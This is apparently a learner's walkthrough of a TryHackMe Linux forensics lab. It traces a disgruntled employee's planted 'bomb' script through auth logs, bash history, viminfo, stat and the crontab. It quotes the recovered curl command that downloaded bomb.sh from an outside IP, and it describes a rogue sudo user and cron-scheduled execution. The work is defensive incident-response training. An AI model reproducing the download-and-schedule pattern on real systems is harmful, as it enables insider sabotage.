# #57: Disgruntled 💡 (Linux Forensics)

Hey, kid! Good, you’re here!

Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.

CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.

## Connecting to the machine

Start the virtual machine in split-screen view by clicking on the green "Start Machine" button on the upper right section of this task. Alternatively, you can connect to the VM using the credentials below via "ssh".

![THM key](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png)

| **Username** | root |
| --- | --- |
| **Password** | password |
| **IP** | MACHINE_IP |

# Task 2: Linux Forensics review

## Pre-requisites

This room requires basic knowledge of Linux and is based on the [Linux Forensics](https://tryhackme.com/room/linuxforensics) room. A cheat sheet is attached below, which you can also download by clicking on the blue `Download Task Files` button on the right.

[LinuxForensicsCheatsheet-1672210006440.pdf](LinuxForensicsCheatsheet-1672210006440.pdf)

# Task 3: Nothing suspicious.. So far

Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.

My advice: Look at the privileged commands that were run. That should get you started.

**Goal:** find the exact command used to install a package with sudo and the working directory when it ran.

---

## Step 1 — check who can sudo / who might have elevated privileges

I started by checking the sudo users list on the host to narrow down which accounts could’ve run an elevated command. That gave me candidates to inspect in their histories.

**Command I ran:**

```
cat /etc/sudoers
```

![image.png](image.png)

---

## Step 2 — inspect the sudo execution history

I think its a good idea to check the sudo execution history by looking at the `auth.log` file found in the /var/log file path.

- I went to the path
    
    ```
    cd /var/log 
    ```
    
    ![image.png](image%201.png)
    
- Read the **auth.log** file for exec history.
    
    I will search for keyword “install” because according to the question the user installed a package, so he probably used an install command. 
    
    ```
    cat sudo auth.log.1 | grep install
    ```
    
    Why **auth.log.1** file? Because I tried finding the install command in **auth.log** file, but it wasn’t there.
    
    ![image.png](image%202.png)
    
    ## Answers
    
    - **Full COMMAND:** `/usr/bin/apt install dokuwiki`
    - **Present Working Directory (PWD):** `/home/cybert`

---

# Task 4: Let’s see if you did anything bad

Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.

Continuing from the previous step where I confirmed the installation of **Dokuwiki**, I moved on to analyze what actions followed right after.

---

## **1. Which user was created after the package from the previous task was installed?**

To trace user creation, I examined the same authentication log file — it records account creation and privilege management actions.

### Command used:

```bash
sudo cat /var/log/auth.log.1 | grep adduser
```

This command searches for any instance where the `adduser` command was executed.

![image.png](image%203.png)

From the output, I identified that a **new user** was added after the Dokuwiki installation.

**Answer:** `it-admin`

---

## **2. A user was then later given sudo privileges. When was the sudoers file updated?**

To find when a user was granted administrative rights, I scanned the `auth.log.1` for updates to the **sudoers** file.

Most admins modify the sudoers file safely using:

```
sudo visudo
```

So, to see when it happened and by whom, I ran the following command:

```
sudo grep 'visudo' auth.log.1
```

![image.png](image%204.png)

By reviewing timestamps in `auth.log.1`, I found the exact moment the file was modified by `cybert`.

**Answer:** `Dec 28 06:27:34`

---

## **3. A script file was opened using the “vi” text editor. What is the name of this file?**

I ran the command:

```
sudo grep “vi” auth.log.1
```

I scrolled down until I see grep specially for “vi” keyword, and not “video”, “visudo” or anything beginning with **vi**. I found this:

![image.png](image%205.png)

Looking closer, the file name mentioned was the suspicious script left by the disgruntled employee.

**Answer:** `bomb.sh`

Do keep in mind that the bomb is planted by the **it-admin** user.

---

# Task 5: Bomb has been planted. But when and where?

That `bomb.sh` file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.

After identifying that the disgruntled employee created and opened the **bomb.sh** script, I continued my analysis to uncover how it was created, modified, and what its purpose was.

---

## **1. What is the command used that created the file bomb.sh?**

To find out how the file was originally created, I checked the **.bash_history** file located in the home directory of the **it-admin** user. This file records all commands executed in the shell by that user.

### Command used:

```bash
cat /home/it-admin/.bash_history
```

![image.png](image%206.png)

From the history log, I found the exact command that fetched the script from a remote server and saved it locally.

**Answer:**

`curl 10.10.158.38:8080/bomb.sh --output [bomb.sh](http://bomb.sh/)`

This confirms that the file was downloaded directly from an external IP using `curl`.

---

## **2. The file was renamed and moved to a different directory. What is the full path of this file now?**

To trace any renaming or movement, I examined the **.viminfo** file — this stores the editing history of files opened in the `vi` editor.

![image.png](image%207.png)

Command I ran:

```
cat .viminfo
```

![image.png](image%208.png)

In the logs, I noticed that **bomb.sh** was renamed and moved to another directory under `/bin`.

**Answer:**

`/bin/os-update.sh`

---

## **3. When was the file from the previous question last modified?**

Now that I knew the new file path, so I went to the bin folder.

```
cd /bin/
```

Then I listed all the items in this folder to make sure the [**os-update.sh**](http://os-update.sh) file is actually here.

![image.png](image%209.png)

After that inorder to check the file’s metadata and confirm when it was last changed.

Command I ran:

```
stat os-update.sh
```

![image.png](image%2010.png)

**Answer** (Format: Month Day HH:MM)

`Dec 28 06:29`

---

## **4. What is the name of the file that will get created when the file from the first question executes?**

To determine the script’s purpose, I opened **/bin/os-update.sh** in a text editor (`nano`) and reviewed its contents. 

Inside the script, I found the code responsible for creating another file upon execution.

![image.png](image%2011.png)

**Answer:**

`goodbye.txt`

# Task 6: Following the fuse

So we have a file and a motive. The question we now have is: how will this file be executed?

Surely, he wants it to execute at some point?

I will have to check system crontab to see when the malicious script would run. I changed directory to the **/etc/** folder because the crontab file is saved there.

![image.png](image%2012.png)

Found the **crontab** file.

![image.png](image%2013.png)

Now I have to read the file’s content.

```
cat crontab
```

![image.png](image%2014.png)

And there it is! Found the time when the bomb is supposed to go off. 

**Answer:** 

`08:00 AM`

---

![image.png](image%2015.png)

---